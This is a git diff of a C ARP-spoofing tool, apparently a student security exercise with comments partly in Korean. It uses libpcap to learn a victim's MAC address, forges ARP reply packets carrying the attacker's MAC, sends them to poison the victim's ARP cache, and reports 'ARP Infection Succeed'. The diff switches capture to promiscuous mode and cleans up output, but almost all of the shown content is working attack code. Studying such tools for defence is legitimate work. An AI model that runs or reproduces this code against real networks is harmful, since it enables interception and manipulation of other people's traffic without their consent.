@@ -17,7 +17,7 @@
 #include <libnet.h>
 #include <pthread.h>
 
-#define PROMISCOUS 1
+#define PROMISCUOUS 1
 #define NONPROMISCUOUS 0
 
 #define IPSTR_MAX 16
@@ -45,45 +45,32 @@ void packetfilter_callback(u_char *useless, const struct pcap_pkthdr *pkthdr, co
     struct libnet_ethernet_hdr *eth_header;     // struct ethhdr 도 가능
     struct libnet_arp_hdr *arp_header;          // struct arphdr도 가능
     unsigned short etherh_protocoltype;
-    int length = pkthdr->len;
 
     char arp_sender_ip[IPSTR_MAX], arp_target_ip[IPSTR_MAX];
     char arp_sender_mac[MACSTR_MAX], arp_target_mac[MACSTR_MAX];
 
-    // get ethernet header
-    eth_header = (struct libnet_ethernet_hdr *)packet;
-    // get get ethernet header -> protocol type
-    etherh_protocoltype = ntohs(eth_header->ether_type);
+    eth_header = (struct libnet_ethernet_hdr *)packet;      // get ethernet header
+    etherh_protocoltype = ntohs(eth_header->ether_type);    // get ethernet header -> protocol type
 
-    printf("\n\n[Ethernet Packet info]\n");
-    printf("   [*] Source MAC address : %s\n", ether_ntoa((const ether_addr *)eth_header->ether_shost));
-    printf("   [*] Destination MAC address : %s\n", ether_ntoa((const ether_addr *)eth_header->ether_dhost));
-
+    printf(".");
     if(etherh_protocoltype == ETHERTYPE_ARP) {
-        // move to offset
-        packet += sizeof(struct libnet_ethernet_hdr);
-        // get ip header
-        arp_header = (struct libnet_arp_hdr *)packet;
+        packet += sizeof(struct libnet_ethernet_hdr);       // move to offset
+        arp_header = (struct libnet_arp_hdr *)packet;       // get arp header
 
         if(ntohs(arp_header->ar_op) == 2) {
-            // move to offset
-            packet += sizeof(struct libnet_arp_hdr);
+            packet += sizeof(struct libnet_arp_hdr);        // move to offset
             inet_ntop(AF_INET, (struct in_addr *)(packet+6), arp_sender_ip, sizeof(arp_sender_ip));
             inet_ntop(AF_INET, (struct in_addr *)(packet+16), arp_target_ip, sizeof(arp_target_ip));
             sprintf(arp_sender_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", *(packet), *(packet+1), *(packet+2), *(packet+3), *(packet+4), *(packet+5));
             sprintf(arp_target_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", *(packet+10), *(packet+11), *(packet+12), *(packet+13), *(packet+14), *(packet+15));
-            printf("[ARP Packet info]\n");
-            printf("   [*] Sender Hardware Address : %s\n", arp_sender_mac);
-            printf("   [*] Sender Protocol Address : %s\n", arp_sender_ip);
-            printf("   [*] Target Hardware Address : %s\n", arp_target_mac);
-            printf("   [*] Target Protocol Address : %s\n", arp_target_ip);
-            if(!strcmp(arp_sender_ip, victim_ip_addr_str)) {
+
+            if(!strcmp(arp_sender_ip, victim_ip_addr_str)) {            // arp reply packet에서 victim ip에 대한 mac address 구하기.
                 strncpy(victim_mac_addr_str, arp_sender_mac, MACSTR_MAX);
+                printf("\n[*] Got Victim Mac Address : %s\n", victim_mac_addr_str);
                 pthread_exit(NULL);
             }
         }
     }
-    printf("\n");
 }
 
 void *get_victim_mac_pcap_thread(void *useless) {
@@ -99,7 +86,6 @@ void *get_victim_mac_pcap_thread(void *useless) {
         printf("%s\n", errbuf);
         exit(1);
     }
-    printf("DEV: %s\n", dev);
 
     // get net, mask info
     int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
@@ -108,7 +94,7 @@ void *get_victim_mac_pcap_thread(void *useless) {
         exit(1);
     }
 
-    pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
+    pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, -1, errbuf);
     if(pcd == NULL) {
         printf("%s\n", errbuf);
         exit(1);
@@ -126,6 +112,8 @@ void *get_victim_mac_pcap_thread(void *useless) {
         exit(0);
     }
 
+    printf("[*] Getting Target Mac Address");
+
     // int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
     // param2(int cnt) : 패킷 캡쳐 몇번(0이면 infinite)
     // param3 : filtered packet이 들어오면 실행되는 handler callback func
@@ -138,7 +126,7 @@ void build_arp_packet(u_char* arp_packet, int operation) {
     unsigned char victim_mac_addr[6];
     unsigned char my_mac_addr[6];
 
-    printf("mymac : %s\n", my_mac);
+    // my mac string -> mac 6byte
     sscanf(my_mac, "%2x:%2x:%2x:%2x:%2x:%2x", my_mac_addr, my_mac_addr+1, my_mac_addr+2, my_mac_addr+3, my_mac_addr+4, my_mac_addr+5);
 
     // ARP Request Packet
@@ -170,7 +158,6 @@ void build_arp_packet(u_char* arp_packet, int operation) {
     }
     // ARP Reply Packet
     else if(operation == 2) {
-        printf("test~!\n");
         arp_packet[20]='\x00'; arp_packet[21]='\x02';   // Opcode : 0x0002(reply)
 
         sscanf(victim_mac_addr_str, "%2x:%2x:%2x:%2x:%2x:%2x", victim_mac_addr, victim_mac_addr+1, victim_mac_addr+2, victim_mac_addr+3, victim_mac_addr+4, victim_mac_addr+5);
@@ -209,13 +196,6 @@ void build_arp_packet(u_char* arp_packet, int operation) {
     arp_packet[14]='\x00'; arp_packet[15]='\x01';   // Hardware type : 0x0001
     arp_packet[16]='\x08'; arp_packet[17]='\x00';   // Protocol type : 0x0800(ipv4)
     arp_packet[18]='\x06'; arp_packet[19]='\x04';   // Hardware size : 0x06, Protocol size : 0x04
-
-    for(int i=0; i<8; i++) {
-        for(int j=0; j<6; j++) {
-            printf("%.2x ", arp_packet[i*6+j]);
-        }
-        printf("\n");
-    }
 }
 
 int main(int argc, char **argv) {
@@ -298,7 +278,9 @@ int main(int argc, char **argv) {
 
     // arp reply attack
     build_arp_packet(arp_packet, 2);
+    printf("[*] Sending Infected ARP Packet");
     for(int i=0; i<3; i++) {
+        printf(".");
         /* Send down the packet */
         if (pcap_sendpacket(pcd, arp_packet, 42 /* size */) != 0)
         {
@@ -306,6 +288,9 @@ int main(int argc, char **argv) {
             return 0;
         }
     }
+    printf("\n[*] ARP Infection Succeed~!\n");
+    printf("   - Target IP addr :%s\n", victim_ip_addr_str);
+    printf("   - Target MAC addr :%s\n\n", victim_mac_addr_str);
 
     return 0;
 }
